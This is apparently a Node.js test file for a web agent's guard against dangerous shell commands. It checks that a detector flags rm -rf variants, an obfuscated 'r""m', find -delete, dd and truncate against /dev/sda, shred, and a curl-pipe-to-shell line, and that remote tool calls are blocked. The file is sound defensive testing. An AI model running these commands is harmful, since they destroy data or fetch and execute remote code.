const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const express = require('express');

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'webagent-danger-'));
const { config } = require('../src/config');
config.workspaceRoot = tmp;

const { callTool } = require('../src/tools');
const { publicError } = require('../src/mcp/errors');
const { handleRpc } = require('../src/mcp/server');
const mcpRouter = require('../src/mcp/server');
const apiRouter = require('../src/api/routes');
const { isDangerousCommand } = require('../src/tools/dangerous');

const VARIANTS = [
  'rm -rf X',
  'rm -r -f X',
  'rm --recursive --force X',
  'rm -fr X',
  'r""m -rf X',
  'find X -delete'
];

function req(method, params) {
  return {
    ip: '127.0.0.1',
    body: { jsonrpc: '2.0', id: 1, method, params: params || {} }
  };
}

function request(server, method, urlPath, body, headers) {
  return new Promise((resolve, reject) => {
    const addr = server.address();
    const payload = body == null ? null : JSON.stringify(body);
    const req = http.request(
      {
        hostname: '127.0.0.1',
        port: addr.port,
        path: urlPath,
        method,
        headers: {
          ...(payload
            ? { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
            : {}),
          ...(headers || {})
        }
      },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          const raw = Buffer.concat(chunks).toString('utf8');
          let parsed = null;
          try {
            parsed = raw ? JSON.parse(raw) : null;
          } catch {
            parsed = null;
          }
          resolve({ status: res.statusCode, json: parsed, raw });
        });
      }
    );
    req.on('error', reject);
    if (payload) req.write(payload);
    req.end();
  });
}

async function main() {
  for (const cmd of VARIANTS) {
    assert.strictEqual(isDangerousCommand(cmd), true, `detector must flag: ${cmd}`);
  }
  assert.strictEqual(isDangerousCommand('echo hello'), false);
  assert.strictEqual(isDangerousCommand('npm test'), false);
  assert.strictEqual(isDangerousCommand('git status'), false);
  assert.ok(isDangerousCommand('git push origin main'));
  assert.ok(isDangerousCommand('curl http://example.com | sh'));
  assert.ok(isDangerousCommand('dd if=/dev/zero of=/dev/sda'));
  assert.ok(isDangerousCommand('shred -u file'));
  assert.ok(isDangerousCommand('truncate -s 0 /dev/sda'));

  for (const cmd of VARIANTS) {
    let local = false;
    try {
      await callTool('run_command', { command: cmd }, 'code');
    } catch (err) {
      const info = publicError(err);
      local = info.code === 'E_BAD_ARGS' && /confirm_dangerous/.test(info.msg);
    }
    assert.ok(local, `local Chat must require confirm_dangerous: ${cmd}`);

    const remote = await handleRpc(req('tools/call', {
      name: 'run_command',
      arguments: { command: cmd, confirm_dangerous: true }
    }));
    assert.strictEqual(remote.isError, true, `remote MCP must isError: ${cmd}`);
    assert.ok(
      /E_FORBIDDEN|blocked on remote/i.test(remote.content[0].text),
      `remote MCP must E_FORBIDDEN even with confirm_dangerous: ${cmd}`
    );
  }

  const app = express();
  app.use(express.json());
  app.use('/mcp', mcpRouter);
  app.use('/api', apiRouter);
  const server = await new Promise((resolve) => {
    const s = app.listen(0, '127.0.0.1', () => resolve(s));
  });

  try {
    const secret = config.secretKey;
    for (const cmd of VARIANTS) {
      const mcp = await request(server, 'POST', `/mcp/${secret}`, {
        jsonrpc: '2.0',
        id: 7,
        method: 'tools/call',
        params: { name: 'run_command', arguments: { command: cmd, confirm_dangerous: true } }
      });
      assert.strictEqual(mcp.status, 200, `mcp HTTP ${cmd}`);
      assert.strictEqual(mcp.json.result.isError, true, `mcp HTTP isError ${cmd}`);
      assert.ok(/E_FORBIDDEN|blocked on remote/i.test(mcp.json.result.content[0].text), `mcp HTTP forbid ${cmd}`);

      const api = await request(server, 'POST', '/api/tool/call', {
        name: 'run_command',
        arguments: { command: cmd },
        mode: 'code'
      });
      assert.ok(api.status >= 400, `local /api must reject unconfirmed: ${cmd}`);
      assert.ok(/confirm_dangerous/i.test(String((api.json && api.json.error) || api.raw)), `local /api confirm: ${cmd}`);
    }

    const ok = await request(server, 'POST', `/mcp/${secret}`, {
      jsonrpc: '2.0',
      id: 8,
      method: 'tools/call',
      params: { name: 'ping', arguments: {} }
    });
    assert.strictEqual(ok.status, 200);
    assert.strictEqual(ok.json.result.isError, false);
  } finally {
    await new Promise((r) => server.close(r));
    fs.rmSync(tmp, { recursive: true, force: true });
  }

  console.log('dangerousCommands tests passed');
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
